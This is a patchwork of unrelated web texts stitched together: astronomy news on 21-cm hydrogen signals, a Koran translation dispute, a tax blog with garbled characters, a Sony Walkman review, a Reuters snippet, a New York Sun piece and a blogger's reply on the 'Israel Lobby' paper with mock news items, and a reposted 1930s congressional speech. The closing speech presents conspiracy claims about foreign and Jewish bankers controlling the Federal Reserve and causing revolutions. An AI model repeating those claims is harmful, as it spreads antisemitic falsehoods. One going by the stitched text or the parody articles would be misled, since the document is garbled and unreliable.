Wyithe and Loeb showed that , in fact , upcoming observatories will be capable of detecting 21 - cm signals from the distant , young universe , even after it gets mostly ionized .
Moreover , while the signal strength decreases after re-ionization , the noise also decreases .
In principle , the 21 - cm signal from neutral hydrogen can be measured from the present epoch all the way up to a redshift of z=15 , when the universe was only 200 million years old .
" There is no other viable technique to study dark energy at high redshifts , " stated Loeb .
Universal Sound Waves
In the universe 's earliest moments , small fluctuations in energy density and pressure caused oscillations , sending out sound waves that expanded across space like ripples in a pond .
The size of the outermost " ripple " is about 500 million light - years across today .
These universal sound waves influenced the large - scale structure in the distribution of galaxies , and indeed their signature was detected recently in galaxy surveys at low redshifts .
Neutral hydrogen gas should show the same distribution patterns as galaxies due to primordial acoustic oscillations .
By studying the large - scale distribution of hydrogen in the early universe , astronomers can learn how dark energy influenced the growth of structure in the crucial first few billion years .
Theoretically , instruments now under construction such as the Murchison ( formerly Mileura ) Wide - field Array ( MWA ) and its future extensions could detect 21 - cm signals from hydrogen in the first 1 to 4 billion years of the universe 's history , corresponding to redshift factors of 1.5 to 6 .
" The broad range of redshifts we can reach is important because we can pick up the signal regardless of when the universe was re-ionized , " explained Wyithe .
Two journal papers describing Wyithe and Loeb 's research are available online at arxiv.org / abs/0708.3392 and arxiv.org/abs/0709.2955 ( the latter with co-author Paul Geil of the University of Melbourne ) .

“ Spank ? ” exclaimed Professor Abou El Fadl , who has concluded that the verse refers to a rare public legal procedure that ended before the 10th century .
“ That is really kinky .
That is the author fantasizing too much . ”
Ms. Bakhtiar , who is 68 and has a doctorate in educational psychology , set out to translate the Koran because she found the existing version inaccessible for Westerners .
Many Jewish and Christian names , for example , have been Arabized , so Moses and Jesus appear in the English version of the Koran as Musa and Issa .
When she reached the problematic verse , Ms. Bakhtiar spent the next three months on “ daraba . ”
She does not speak Arabic , but she learned to read the holy texts in Arabic while studying and working as a translator in Iran in the 1970s and ’ 80s .
Her eureka moment came on roughly her 10th reading of the Arabic - English Lexicon by Edward William Lane , a 3,064 - page volume from the 19th century , she said .
Among the six pages of definitions for “ daraba ” was “ to go away . ”
“ I said to myself , ‘ Oh , God , that is what the prophet meant , ’ ” said Ms. Bakhtiar , speaking in the offices of Kazi Publications in Chicago , a mail - order house for Islamic books that is publishing her translation .
“ When the prophet had difficulty with his wives , what did he do ?
He did n’t beat anybody , so why would any Muslim do what the prophet did not ? ”
She thinks the “ beat ” translation contradicts another verse , which states that if a woman wants a divorce , she should not be mistreated .
Given the option of staying in the marriage and being beaten , or divorcing , women would obviously leave , she said .

There have been similar interpretations , but none have been incorporated into a translation .
Debates over translations of the Koran — considered God ’s eternal words — revolve around religious tradition and Arabic grammar .
Critics fault Ms. Bakhtiar on both scores .

And as the Wall Street Journal might present it :

Li comes news of what has to be the most extreme example of the “ temporary ” tax that will not die :
One instance of bad public policy which can do harm is the Business Professional and Occupational License ( BPOL ) tax thatâ€™s imposed on entrepreneurs by Virginia localities .
Â
It was enacted in order to offset public expenditures by these localities incurred during the War Of 1812 , and like many â€œtemporary revenue enhancementsâ€ has lived on into near immortality .
Â
This confusing law and the local ordinances which determine tax rates and revenues subject to this tax make complying with this law nearly as cumbersome as the requirement to actually pay the tax .
Â
The effect is to discourage the development of small businesses .
In case you have n’t gotten the memo , the War of 1812 ended 193 years ago .
While I have no direct evidence of how much money Virginia localities contributed to pay for that war , I ’m pretty sure they ’ve been reimbursed , in full , with interest by now .
Â
If nothing else , Virginia ’s BPOL , and the fact that it has resisted any effort to repeal it for almost two centuries , stands as evidence that there is no such thing as a temporary tax .
Sony NWZ - S610 Walkman ( Review )
Skatter
Tech recently got a hold of Sony ’s NWZ - S610 Video Walkman to review and we have been messing around with it for a few days .
We ’ve got to say that Sony should be proud since they have finally taken a big step by launching Video Walkmans which are also “ open format . ”
( Means support for most DRM - Free music formats . )
If they keep up the pace , this could help them regain their market share in the portable media sector .
Getting back to the review , since this was Sony ’s first Walkman in the U.S. that can playback video and the first to be “ open format , ” we were n’t expecting too much .
As we got more into the player ’s features and capabilities , we were surprisingly impressed with what Sony has turned out .
Just to heat things up , we ’ll even go as far to say that we ’d recommend this over Apple ’s new iPod Nano !
Sony NWZ -S Walkman Specs :
Type : Portable Flash Video Player
Capacities : 2GB , 4GB , & 8GB
Screen : 1.8 - inch 320 x 240 LCD
Music Format : AAC , MP3 & WMA
Video Format : MP4 Only
Special : FM Tuner w/ Presets
Colors : Silver , Black , Pink & Red
Connection Type : USB 2.0
Price Range : $ 99 -$ 179
The Body : – 3.5/5
The S610 ’s body is simple and elegant , but not eye - catching .
The unit is quite durable and would n’t be easy to break .
The Walkman is just 3.25 inches tall , 1.7 inches wide , and .45 inches thick , making way sleeker , but thicker and taller than the new iPod Nano .
On the front you ’ll find the display followed by the navigation controls right below .
At first we assumed the four - way commands were touch sensitive , but it ended up that all the controls on the unit are actually hard keys .
The ‘ back ’ and ‘ option ’ buttons , which are awkwardly placed at the top left and top right , are used to return to the previous menu and bring up an options menu .
We felt both these buttons should have been placed elsewhere , but it was n’t a problem after some getting used to .
The ‘ play ’ button in the center acts as the enter key .
I actually prefer hard keys since it is easier to navigate the player without having to be looking at it .
The hold key can be found on the left side and the volume controls are on the right .
Other than that the stereo headphone jack can be found on the top of the unit while the data port for syncing and a reset pinhole are on the bottom .
– 5/5 The 1.8 - inch display , just .2 inches smaller than the Nano , is surprisingly bright and sharp enough to watch videos on .
The resolution is a standard 320 x 240 and plays at 30 FPS .
We did n’t notice any lag or audio / video sync issues and the screen did n’t go dark when viewed at from angles as it does on many portable players .
Instead of making the S610 “ fat ” like the new Nano , to retain the form factor the screen has instead been placed on the unit vertically .
This of course means to utilize the entire display , the unit must be held sideways when watching videos .
To make the unit friendly to left and right handed owners , the video and photo orientation can be set in the options to rotate to the preferred side .
Battery Life : – 5/5
Sony ’s always been on top of things when it comes to battery life .
My 3 - year - old thumbdrive sized Walkman often lasts up to 50 hours .
In the case of the S610 , it supposedly lasts up to 33 hours for music playback and an amazing 9.5 hours for video playback .
This of course depends on many factors including volume level , screen brightness , file sizes , and plenty more .
Either way that ’s quite good considering that the new iPod Nano is limited to approximately 24 hours of audio and 5 hours of video .
Media Formats : – 5/5
As we mentioned in the intro , Sony has finally gone “ open format ” with this Walkman and two others .
They have dumped Sonic Stage , the Connect music store , and even the ATRAC format .
For music , the S610 now supports MP3 , AAC , WMA , and WAV all of which have to be free of DRM .
The player is also compatible with Napster ’s Subscription Based service and iTunes Plus tracks .
As for video , the S610 will playback MP4 formats encoded in H.264/AVC and AAC .
This part was a bit disappointing since they do n’t exactly offer much leniency onto other formats .
It even got worse when we realized that they had n’t included any conversion tools , specify where to download samples , or to know exactly what is supported .
This was n’t an issue for us since we ’ve got tools to re-encode videos , however some one - click conversion tool like the one in iTunes should be included for general consumers .
We also found that all the Movie Trailers we downloaded which were encoded for iPods on iTunes worked just perfectly .
Finally for the part people almost never use , photos , the unit has been limited only to JPEG .
Interface : – 4/5
We were quite pleased with the interface as not only looked fancy , but was also clean and quick .
The learning curve is short , only requiring a few minutes to master .
The Walkman has even got some neat features such as holding the ‘ back ’ key will take you back to the main menu and the ‘ option ’ key will power down the Walkman .
Music can be surfed through by Album , Artist , Genre , Year , or in a long list of All Songs .
Photos will appear in a simple folder layout just as they are copied onto the unit .
Videos on the other hand will appear in a straightforward single list with thumbnails .
The Now Playing screen displays standard song data plus Album Art .
In addition to the standard Shuffle , Sony has added an interesting “ Time Machine ” Shuffle now randomly selects a year and plays songs within it .
A search feature , which only works for music , can be found in the main menu , however was quite disappointing since it only lets users search for the starting alphabet of an Album , Artist or Song .
The settings menu were pretty clear - cut , offering equalizer , volume limiting , and playback mode settings for music , slideshow interval settings for photos , and orientation plus brightness options for videos .
FM Radio : – 4.5/5
The quality of the built in radio was strikingly good .
It has been hard wired and coded into the unit and is n’t just an extra add - on .
Browsing through channels was both smooth and quick .
The Walkman utilizes the plugged in headphones as an antenna to gain better signal .
Users can save their favorite stations into any of the 30 available presets by simply holding down the “ play ” key .
– 5/5 Transferring data to the NWZ - S610 was a cinch .
We did n’t have to deal with any drivers or compatibility issues , both my Vista and XP machines detected and self - configured the device automatically after connecting the USB cable .
Since the unit is “ Play For Sure ” it works with Windows Media Player 11 .
We had no issue copying songs over and received no errors .
Since the songs are DRM - Free the unit is n’t limited to just a few “ licensed machines ” as iPods are .
Songs can be taken from one machine and a friend can easily copy , add or remove your files .
We did n’t have a chance to test the unit on a Mac OS X computer and Sony does n’t mention anything about it .
We ’re going to assume that if a Mac is able to recognize the unit as a mass storage device there should n’t be any problems since the Walkman automatically creates Music , Picture , and Video folders , which can be seen when the drive folder is opened .
When compatible media is copied into the corresponding folders , the Walkman will automatically index them after being disconnected , and the items will appear in the interface .
In The Box : – 3.5/
5
Other than the S610 Walkman , Sony bundles a pair of stereo headphones , a USB cable , a dock adapter , and a Quick Start guide .
For such a great Walkman we were very disappointed to see how poor of quality the included headphones were .
If you purchase this Walkman or even an iPod for that matter , we suggest upgrading to the Shure SE110 or SE210 .
Anyways , back to the box , a CD with Windows Media Player 11 , Napster ( trial ) , and a MP3 Conversion Tool ( based off SonicStage ) was also included .
Overall we give Sony ’s Video Walkman a BIG THUMBS UP !
Even though some work still needs to be done around the video part , I was satisfied to see that they have finally dumped DRM which was holding them back .
I will bet that if they continue to keep their players open to a variety of content , they will be able to boost their sales .
As we mentioned the video codecs are a bit limited , but most iPod formatted content should work .
This should also be resolved possibly with a firmware update or when they launch a second generation Video Walkman .
As for this one , it is available online and in stores as of this month and is very reasonably priced at $ 99 , $ 129 , and $ 179 for 2GB , 4GB , and 8GB .
Exactly $ 20 cheaper than each of the new iPod Nanos of the corresponding size capacities .
We recommend this Sony Walkman to anyone who is finally willing to give iPods a break , wants to be free from DRM , likes occasionally listen to the radio , and is looking for a cheaper unique product which everyone else does n’t have .
Important Note :
The unit which was provided by Sony and was used for review was the NZW - S616 F which held 4GB and was silver .

ABOARD AIR FORCE ONE ( Reuters ) - U.S. Ambassador to Iraq Ryan Crocker and the top U.S. commander in Iraq , Gen. David Petraeus , will likely testify to Congress about progress in the war on September 11 or September 12 , the White House said on Monday .
White House spokesman Gordon Johndroe , speaking on Air Force One headed with President George W. Bush to a summit in Canada , said the hearing date was not related to the anniversary of the 2001 attacks .
The September progress report is seen in Washington as a pivotal milestone in assessing whether the Pentagon ’s so - called surge strategy has worked .
That strategy has aimed to establish enough security to allow Iraqi politicians to move toward reconciliation .
The report was due on September 15 , a Saturday .
Johndroe said congressional schedules would likely dictate a September 11 or September 12 hearing date .

David Duke Claims to Be Vindicated By a Harvard Dean
BY ELI LAKE - Staff Reporter of the Sun
March 20 , 2006
A paper recently co-authored by the academic dean of Harvard 's Kennedy School of Government about the allegedly far - reaching influence of an " Israel lobby " is winning praise from white supremacist David Duke .
The Palestine Liberation Organization mission to Washington is distributing the paper , which also is being hailed by a senior member of Egypt 's Muslim Brotherhood , an Islamist organization .
But the paper , " The Israel Lobby and U.S. Foreign Policy , " by the Kennedy School 's Stephen Walt and John Mearsheimer of the University of Chicago , is meeting with a more critical reception from many of those it names as part of the lobby .
The 83 - page " working paper " claims a network of journalists , think tanks , lobbyists , and largely Jewish officials have seized the foreign policy debate and manipulated America to invade Iraq .
Included in this network , the authors say , are the editors of the New York Times , the scholars at the Brookings Institution , students at Columbia , " pro-Israel " senior officials in the executive branch , and " neoconservative gentiles " including columnist George Will .
Duke , a former Louisiana state legislator and one - time Ku Klux Klan leader , called the paper " a great step forward , " but he said he was " surprised " that the Kennedy School would publish the report .
" I have read about the report and read one summary already , and I am surprised how excellent it is , " he said in an e-mail .
" It is quite satisfying to see a body in the premier American University essentially come out and validate every major point I have been making since even before the war even started . "
Duke added that " the task before us is to wrest control of America 's foreign policy and critical junctures of media from the Jewish extremist Neocons that seek to lead us into what they expectantly call World War IV . "
Mr. Walt said last night , " I have always found Mr. Duke 's views reprehensible , and I am sorry he sees this article as consistent with his view of the world . "
" I think that the people who wrote that report were working for the interest of the American people , " a senior member of the Egyptian Muslim Brotherhood 's guidance council , Abdulmo 'em Abulfotah , said yesterday .
" I ask a question here :
Is it in the interest of the American people to clash with 1.3 billion people in favor of 5 million people who represent the Zionist project ?
Not even the Jews , but the Zionists . "
A professor at Harvard Law School , Alan Dershowitz , whom the authors call an " apologist " for Israel , said he found much of the paper to be " trash . "
He said , " It could have been written by Pat Buchanan , by David Duke , Noam Chomsky , and some of the less intelligent members of Hamas .
An intelligent member of Hamas would not have made these mistakes . "
Those mistakes for Mr. Dershowitz include , for example , the assertion that " There is no question , for example , that many Al Qaeda leaders , including bin Laden , are motivated by Israel 's presence in Jerusalem and the plight of the Palestinians , " which Mr. Dershowitz says " is just absurd . "
Mr. Dershowitz was particularly troubled by the claim in the paper that Israeli " citizenship is based on the principle of blood kinship . "
He pointed out that the authors had conflated Israel 's law of return with its criteria for citizenship .
" That 's right from the neo Nazi Web sites .
Anybody can be a citizen of Israel .
He confuses the law of return for the criteria for citizenship .
He never mentions that a Jew cannot be a citizen in Jordan and Saudi Arabia , " Mr. Dershowitz said .
A retired lecturer at Harvard , Martin Peretz , who is editor of The New Republic , a magazine named in the report as one of those that " zealously defend Israel at every turn , " said , " It is easier to attribute disloyalty to Jews than to question the loyalty of Islamists .
This is really questioning the loyalty of Jews , that is what this is about .
Everyone is looped in , even people who are a little dicey about Israel like Aaron David Miller and Howard Dean .
This goes from the lobby in capital letters , from Jerry Falwell to every left wing Jewish Democrat in the House .
It is the imagining of a wall to wall conspiracy and therefore it 's nutsy . "
Another way the authors say the Israel lobby exercises influence is through think tanks .
Under the subchapter heading " Think Tanks that Think One Way , " the authors say , " Pro Israel forces have established a commanding presence at the American Enterprise Institute , the Brookings Institution , the Center for Security Policy , the Foreign Policy Research Institute , the Heritage Foundation , the Hudson Institute , the Institute for Foreign Policy Analysis , and the Jewish Institute for National Security Affairs ( JINSA ) . "
The president of the Hudson Institute , Herbert London , said the notion that his institution had a standard line on American policy to Israel " was patently absurd . "
He pointed out that a senior fellow at his institute was the former director of the National Security Agency , William Odom , who has not only been a vociferous critic of Israel but also the Iraq war .
Jean - Marie Le Pen Cheers Israel 's attack on Palestinians
BY ELI Fake - Staff Reporter of the Sun
April 4 , 2002
Israel 's attack on the Palestinian Authority 's infrastructure in the West Bank has been hailed by French politician Jean - Marie Le Pen , who has been accused by many critics of being an anti-Semite .
Le Pen told Israel 's Haaretz that he have would adopted PM Sharon 's strategy and expressed some concern that the Israeli public has n't been supportive of these policies .
Head of the U.S. Nazi Party :
The Fuhrer would have voted for Congressman John Smith
By Eli Fake
Hans Reichmaster , the leader of the U.S. Nazi party is certain that " the Fuhrer would have voted for Congressman John Smith . "
Indeed , Congressman John Smith and Adolph Hitler have so much in common :
They were both vegetarians , they both campaigned for the environment and against smoking , and they both had pets .
Congressman Miller refused to respond to his endorsement by Reichmaster .
Stephen WaltJohn MearsheimerIn an earlier post I discussed an article authored by two of my favorite political scientists , John Mearsheimer ( the Wendell Harrison Professor of Political Science at Chicago ) and Stephen Walt ( the Robert and Renee Belfer Professor of International Affairs at the Kennedy School of Government at Harvard ) on the Israel Lobby which was published in the new issue of the London Review of Books .
I 'd assumed that the article ( which was based on a research paper that I have n't read yet ) would iginte a heated debate and some controversy .
And it should .
After all , the the Israeli Lobby , the American Israel Public Affairs Committee ( AIPAC ) is not only the most powerful foreign policy looby in Washington but has exerted an enormous ( and that 's an understatment ! ) influence on U.S. policy in the Middle East , a region in which American intervention has resulted in major costs for the American people ( terrorism , wars , a lot of $ $ $ ) .
I 've been at the receiving end of attacks by the Lobby and its many front - organizations and satellites .
But I was trying to figure out how these guys were going to deal with Mearsheimer and Walt who are n't , after all , one of those radical , left - wing , pro-Arab professors that David Horowitz loves to bash .
Mearsheimer and Walt are full - time members of the inner-circle of the U.S. foreign policy establishment and its more " realist " wing and maintain close personal and professional ties to the Power Elite in Washington .
In short , it 's not your " loony left " ( Noam Chomsky ...
Noam Chomsky ... ) or the " isolationist right " ( Pat Buchanan ... Pat Buchanan ... ) .
So what are you going to do ? :
You associate Mearsheimer and Walt with ... forget Chomsky and Buchanan ... David Duke !
And the Moslem Brotherhood .
Seriously .
The following was published in the neocon daily , New York Sun Here are some hghlights : What can I say ?
Eli Lake could certainly get a job at the original Pravda .
Now .. let 's see ... four years ago , as Israeli troops led by PM Ariel Sharon were launching a devasatating attack on the Palestinian Authority , French right - winger Jean - Marie Le Pen , who has been accused of being an anti-Semite and racist , expressed support for Sharon and the Israeli action in an interview with Haaretz So ...
Or how about leading articles on vegeterians , environmentalist and anti-smokers and pet-loves with a favorable quote from Adolph Hitler or his followers :
On a more serious note : Although I had some reservations about several of the arguments made by Mearsheimer and Walt , let 's make something clear : AIPAC and Israel are political entities and not Jewish religious icons and critical comments about them should n't be equated with anti-Semitism .
Many of the responses by the Lobby 's supporters are quite silly and wrong .
Note the comments by London from the Hudson Institute .
I mean , their Middle East center is headed by an American - Israeli Likudnik who also happens to be married to leading neocon official David Wurmser .
So if a repurted anti-Semite who was married to a partner of David Duke would be heading a Center for Jewish Studies in some think tank we would not have a right to question its objectivity ?
Congressman McFadden on the Federal Reserve Corporation
Remarks in Congress , 1934 AN ASTOUNDING EXPOSURE
On May 23 , 1933 , Congressman , Louis T. McFadden , brought formal charges against the Board of Governors of the Federal Reserve Bank system , The Controller of the Currency and the Secretary of United States Treasury for numerous criminal acts , including but not limited to , CONSPIRACY , FRAUD , UNLAWFUL CONVERSION , AND TREASON .
The petition for Articles of Impeachment was thereafter referred to the Judiciary Committee and has YET TO BE ACTED ON .
So , this ELECTRONIC BOOKLET should be reprinted , re-posted , set up on web pages and circulated far and wide .
Congressman McFadden's Speech
Quotations from several speeches made on the Floor of the House of Representatives by the Honorable Louis T. McFadden of Pennsylvania .
Mr. McFadden , due to his having served as Chairman of the Banking and Currency Committee for more than 10 years , was the best posted man on these matters in America and was in a position to speak with authority of the vast ramifications of this gigantic private credit monopoly .
As Representative of a State which was among the first to declare its freedom from foreign money tyrants it is fitting that Pennsylvania , the cradle of liberty , be again given the credit for producing a son that was not afraid to hurl defiance in the face of the money - bun .
Whereas Mr. McFadden was elected to the high office on both the Democratic and Republican tickets , there can be no accusation of partisanship lodged against him .
Because these speeches are set out in full in the Congressional Record , they carry weight that no amount of condemnation on the part of private individuals could hope to carry .
The Federal Reserve - A Corrupt Institution
" Mr. Chairman , we have in this Country one of the most corrupt institutions the world has ever known .
I refer to the Federal Reserve Board and the Federal Reserve Banks , hereinafter called the Fed .
The Fed has cheated the Government of these United States and the people of the United States out of enough money to pay the Nation 's debt .
The depredations and iniquities of the Fed has cost enough money to pay the National debt several times over . "
" This evil institution has impoverished and ruined the people of these United States , has bankrupted itself , and has practically bankrupted our Government .
It has done this through the defects of the law under which it operates , through the maladministration of that law by the Fed and through the corrupt practices of the moneyed vultures who control it . "
" Some people who think that the Federal Reserve Banks United States Government institutions .
They are private monopolies which prey upon the people of these United States for the benefit of themselves and their foreign customers ; foreign and domestic speculators and swindlers ; and rich and predatory money lender .
In that dark crew of financial pirates there are those who would cut a man 's throat to get a dollar out of his pocket ; there are those who send money into states to buy votes to control our legislatures ; there are those who maintain International propaganda for the purpose of deceiving us into granting of new concessions which will permit them to cover up their past misdeeds and set again in motion their gigantic train of crime . "
" These twelve private credit monopolies were deceitfully and disloyally foisted upon this Country by the bankers who came here from Europe and repaid us our hospitality by undermining our American institutions .
Those bankers took money out of this Country to finance Japan in a war against Russia .
They created a reign of terror in Russia with our money in order to help that war along .
They instigated the separate peace between Germany and Russia , and thus drove a wedge between the allies in World War .
They financed Trotsky 's passage from New York to Russia so that he might assist in the destruction of the Russian Empire .
They fomented and instigated the Russian Revolution , and placed a large fund of American dollars at Trotsky 's disposal in one of their branch banks in Sweden so that through him Russian homes might be thoroughly broken up and Russian children flung far and wide from their natural protectors .
They have since begun breaking up of American homes and the dispersal of American children .
Mr. Chairman , there should be no partisanship in matters concerning banking and currency affairs in this Country , and I do not speak with any . "
" In 1912 the National Monetary Association , under the chairmanship of the late Senator Nelson W. Aldrich , made a report and presented a vicious bill called the National Reserve Association bill .
This bill is usually spoken of as the Aldrich bill .
Senator Aldrich did not write the Aldrich bill .
He was the tool , if not the accomplice , of the European bankers who for nearly twenty years had been scheming to set up a central bank in this Country and who in 1912 has spent and were continuing to spend vast sums of money to accomplish their purpose . "
" We were opposed to the Aldrich plan for a central bank .
The men who rule the Democratic Party then promised the people that if they were returned to power there would be no central bank established here while they held the reigns of government .
Thirteen months later that promise was broken , and the Wilson administration , under the tutelage of those sinister Wall Street figures who stood behind Colonel House , established here in our free Country the worm - eaten monarchical institution of the ' King 's Bank ' to control us from the top downward , and from the cradle to the grave . "
" The Federal Reserve Bank destroyed our old and characteristic way of doing business .
It discriminated against our 1 - name commercial paper , the finest in the world , and it set up the antiquated 2 - name paper , which is the present curse of this Country and which wrecked every country which has ever given it scope ; it fastened down upon the Country the very tyranny from which the framers of the Constitution sough to save us . "
PRESIDENT JACKSON'S TIME
" One of the greatest battles for the preservation of this Republic was fought out here in Jackson 's time ; when the second Bank of the United States , founded on the same false principles of those which are here exemplified in the Fed was hurled out of existence .
After that , in 1837 , the Country was warned against the dangers that might ensue if the predatory interests after being cast out should come back in disguise and unite themselves to the Executive and through him acquire control of the Government .
That is what the predatory interests did when they came back in the livery of hypocrisy and under false pretenses obtained the passage of the Fed . "
" The danger that the Country was warned against came upon us and is shown in the long train of horrors attendant upon the affairs of the traitorous and dishonest Fed .
Look around you when you leave this Chamber and you will see evidences of it in all sides .
This is an era of misery and for the conditions that caused that misery , the Fed are fully liable .
This is an era of financed crime and in the financing of crime the Fed does not play the part of a disinterested spectator . "
" It has been said that the draughts man who was employed to write the text of the Aldrich bill because that had been drawn up by lawyers , by acceptance bankers of European origin in New York .
It was a copy , in general a translation of the statues of the Reichsbank and other European central banks .
One - half million dollars was spent on the part of the propaganda organized by these bankers for the purpose of misleading public opinion and giving Congress the impression that there was an overwhelming popular demand for it and the kind of currency that goes with it , namely , an asset currency based on human debts and obligations .
Dr. H. Parker Willis had been employed by Wall Street and propagandists , and when the Aldrich measure failed - he obtained employment with Carter Glass , to assist in drawing the banking bill for the Wilson administration .
He appropriated the text of the Aldrich bill .
There is no secret about it .
The test of the Federal Reserve Act was tainted from the first . "
" A few days before the bill came to a vote , Senator Henry Cabot Lodge , of Massachusetts , wrote to Senator John W. Weeks as follows :
New York City ,
December 17 , 1913 ' My Dear Senator Weeks : Throughout my public life I have supported all measures designed to take the Government out of the banking business .
This bill puts the Government into the banking business as never before in our history .
The powers vested in the Federal Reserve Board seen to me highly dangerous especially where there is political control of the Board .
I should be sorry to hold stock in a bank subject to such dominations .
The bill as it stands seems to me to open the way to a vast inflation of the currency .
I had hoped to support this bill , but I cannot vote for it cause it seems to me to contain features and to rest upon principles in the highest degree menacing to our prosperity , to stability in business , and to the general welfare of the people of the United States .
Very Truly Yours ,
Henry Cabot Lodge .'
" In eighteen years that have passed since Senator Lodge wrote that letter of warning all of his predictions have come true .
The Government is in the banking business as never before .
Against its will it has been made the backer of horse thieves and card sharps , bootlegger 's smugglers , speculators , and swindlers in all parts of the world .
Through the Fed the riffraff of every country is operating on the public credit of the United States Government . "
THE GREAT DEPRESSION
" Meanwhile and on account of it , we ourselves are in the midst of the greatest depression we have ever known .
From the Atlantic to the Pacific , our Country has been ravaged and laid waste by the evil practices of the Fed and the interests which control them .
At no time in our history , has the general welfare of the people been at a lower level or the minds of the people so full of despair . "
" Recently in one of our States , 60,000 dwelling houses and farms were brought under the hammer in a single day .
71,000 houses and farms in Oakland County , Michigan , were sold and their erstwhile owners dispossessed .
The people who have thus been driven out are the wastage of the Fed .
They are the victims of the Fed .
Their children are the new slaves of the auction blocks in the revival of the institution of human slavery . "
The Scheme of the Fed
" In 1913 , before the Senate Banking and Currency Committee , Mr. Alexander Lassen made the following statement : ' The whole scheme of the Fed with its commercial paper is an impractical , cumbersome machinery - is simply a cover to secure the privilege of issuing money , and to evade payment of as much tax upon circulation as possible and then control the issue and maintain , instead of reducing interest rates .
It will prove to the advantage of the few and the detriment of the people .
It will mean continued shortage of actual money and further extension of credits , for when there is a shortage of money people have to borrow to their cost .
' A few days before the Fed passed , Senator Root denounced the Fed as an outrage on our liberties .
He predicted : ' Long before we wake up from our dream of prosperity through an inflated currency , our gold - which alone could have kept us from catastrophe - will have vanished and no rate of interest will tempt it to return . ' "
" If ever a prophecy came true , that one did . "
" The Fed became law the day before Christmas Eve , in the year 1913 , and shortly afterwards , the German International bankers , Kuhn , Loeb and Co. sent one of their partners here to run it . "
" The Fed Note is essentially unsound .
It is the worst currency and the most dangerous that this Country has ever known .
When the proponents of the act saw that the Democratic doctrine would not permit them to let the proposed banks issue the new currency as bank notes , they should have stopped at that .
They should not have foisted that kind of currency , namely , an asset currency , on the United States Government .
They should not have made the Government [ liable on the private ] debts of individuals and corporations , and , least of all , on the private debts of foreigners .
As Kemerer says : ' The Fed Notes , therefore , in form , have some of the qualities of Government paper money , but in substance , are almost a pure asset currency possessing a Government guarantee against which contingency the Government has made no provision whatever . ' "
" Hon. L.J.
Hill , a former member of the House , said , and truly : ' They are obligations of the Government for which the United States received nothing and for the payment of which at any time , it assumes the responsibility : looking to the Fed to recoup itself . ' "
" If this United States is to redeem the Fed Notes , when the General Public finds it costs to deliver this paper to the Fed , and if the Government has made no provisions for redeeming them , the first element of unsoundness is not far to seek . "
" Before the Banking and Currency Committee , when the bill was under discussion Mr. Crozier of Cincinnati said : ' The imperial power of elasticity of the public currency is wielded exclusively by the central corporations owned by the banks .
This is a life and death power over all local banks and all business .
It can be used to create or destroy prosperity , to ward off or cause stringencies and panics .
By making money artificially scarce , interest rates throughout the Country can be arbitrarily raised and the bank tax on all business and cost of living increased for the profit of the banks owning these regional central banks , and without the slightest benefit to the people .
The 12 Corporations together cover y and monopolize and use for private gain - every dollar of the public currency and all public revenue of the United States .
Not a dollar can be put into circulation among the people by their Government , without the consent of and on terms fixed by these 12 private money trusts . ' "
" In defiance of this and all other warnings , the proponents of the Fed created the 12 private credit corporations and gave them an absolute monopoly of the currency of these United States - not of the Fed Notes alone - but of all other currency !
The Fed Act providing ways and means by which the gold and general currency in the hands of the American people could be obtained by the Fed in exchange for Fed Notes - which are not money - but mere promises to pay . "
" Since the evil day when this was done , the initial monopoly has been extended by vicious amendments to the Fed and by the unlawful and treasonable practices of the Fed . "
Money for the Scottish Distillers
" Mr. Chairman , if a Scottish distiller wishes to send a cargo of Scotch whiskey to these United States , he can draw his bill against the purchasing bootlegger in dollars and after the bootlegger has accepted it by writing his name across the face of it , the Scotch distiller can send that bill to the nefarious open discount market in New York City where the Fed will buy it and use it as collateral for a new issue of Fed Notes .
Thus the Government of these United States pay the Scotch distiller for the whiskey before it is shipped , and if it is lost on the way , or if the Coast Guard seizes it and destroys it , the Fed simply write off the loss and the government never recovers the money that was paid to the Scotch distiller . "
" While we are attempting to enforce prohibition here , the Fed are in the distillery business in Europe and paying bootlegger bills with public credit of these United States .
" Mr. Chairman , by the same process , they compel our Government to pay the German brewer for his beer .
Why should the Fed be permitted to finance the brewing industry in Germany either in this way or as they do by compelling small and fearful United States Banks to take stock in the Isenbeck Brewery and in the German Bank for brewing industries ?
Mr. Chairman , if Dynamit Nobel of Germany , wishes to sell dynamite in Japan to use in Manchuria or elsewhere , it can drew its bill against the Japanese customers in dollars and send that bill to the nefarious open discount market in New York City where the Fed will buy it and use it as collateral for a new issue of Fed Notes - while at the same time the Fed will be helping Dynamit Nobel by stuffing its stock into the United States banking system . "
" Why should we send our representatives to the disarmament conference at Geneva - while the Fed is making our Government pay Japanese debts to German Munitions makers ? "
" Mr. Chairman , if a German wishes to raise a crop of beans and sell them to a Japanese customer , he can draw a bill against his prospective Japanese customer in dollars and have it purchased by the Fed and get the money out of this Country at the expense of the American people before he has even planted the beans in the ground .
Mr. Chairman , if a German in Germany wishes to export goods to South America , or any other Country , he can draw his bill against his customers and send it to these United States and get the money out of this Country before he ships , or even manufactures the goods . "
" Mr. Chairman , why should the currency of these United States be issued on the strength of German Beer ?
Why should it be issued on the crop of unplanted beans to be grown in Chili for Japanese consumption ?
Why should these United States be compelled to issue many billions of dollars every year to pay the debts of one foreigner to another foreigner ?
Was it for this that our National Bank depositors had their money taken out of our banks and shipped abroad ?
Was it for this that they had to lose it ?
Why should the public credit of these United States and likewise money belonging to our National Bank depositors be used to support foreign brewers , narcotic drug vendors , whiskey distillers , wig makes , human hair merchants , Chilean bean growers , to finance the munition factories of Germany and Soviet Russia ? "
THE UNITED STATES HAS BEEN RANSACKED
" The United States has been ransacked and pillaged .
Our structures have been gutted and only the walls are left standing .
While being perpetrated , everything the world would rake up to sell us was brought in here at our expense by the Fed until our markets were swamped with unneeded and unwanted imported goods priced far above their value and make to equal the dollar volume of our honest exports , and to kill or reduce our favorite balance of trade .
As Agents of the foreign central banks the Fed try by every means in their power to reduce our favorable balance of trade .
They act for their foreign principal and they accept fees from foreigners for acting against the best interests of these United States .
Naturally there has been great competition among foreigners for the favors of the Fed . "
" What we need to do is to send the reserves of our National Banks home to the people who earned and produced them and who still own them and to the banks which were compelled to surrender them to predatory interests . "
" Mr. Chairman , there is nothing like the Fed pool of confiscated bank deposits in the world .
It is a public trough of American wealth in which the foreigners claim rights , equal to or greater than Americans .
The Fed are the agents of the foreign central banks .
They use our bank depositors ' money for the benefit of their foreign principals .
They barter the public credit of the United States Government and hire it our to foreigners at a profit to themselves . "
" All this is done at the expense of the United States Government , and at a sickening loss to the American people .
Only our great wealth enabled us to stand the drain of it as long as we did . "
" We need to destroy the Fed wherein our national reserves are impounded for the benefit of the foreigners .
" We need to save America for Americans . "
SPURIOUS SECURITIES
